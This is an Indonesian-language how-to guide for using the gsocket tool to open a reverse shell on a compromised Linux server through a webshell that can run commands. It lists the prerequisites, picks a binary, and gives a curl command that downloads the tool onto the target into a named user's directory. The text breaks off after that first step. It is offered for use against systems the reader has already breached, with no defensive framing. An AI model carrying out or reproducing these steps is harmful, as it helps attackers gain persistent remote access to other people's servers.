# 🚀 Gsocket Root Shell Setup Guide

Panduan lengkap untuk setup reverse shell menggunakan **gsocket** melalui webshell terbatas.

---

## 📋 Prasyarat

- **Server Target:** Linux x86_64
- **Akses:** Webshell dengan eksekusi perintah (`exec`, `system`, dll.)
- **Komputer Kamu:** Ubuntu/Linux (untuk client)
- **Secret:** Kata sandi untuk koneksi (bisa diganti)

---

## 🎯 File yang Dipilih

Untuk sistem **Linux 64-bit (x86_64)**, gunakan file ini dari release terbaru:

| **File** | **Ukuran** | **Keterangan** |
|---|---|---|
| `gsocket_linux-x86_64.tar.gz` | ~1.3 MB | Binary statis siap pakai (disarankan) |
| `gs-netcat_linux-x86_64` | ~2.8 MB | Binary langsung (tanpa ekstrak) |
| `gsocket_1.4.43_x86_64.deb` | ~1.2 MB | Paket Debian/Ubuntu |

> **⚠️ Catatan:** Jangan gunakan URL lawas seperti `gsocket_x86_64-static.tar.gz` karena sudah tidak tersedia di versi terbaru.

---

## 📝 Step-by-Step

### 1️⃣ Download Binary di Server Target

Akses webshell dan jalankan:

```bash
curl -L https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gsocket_linux-x86_64.tar.gz -o /home/smkkoper/tmp/gs.tar.gz
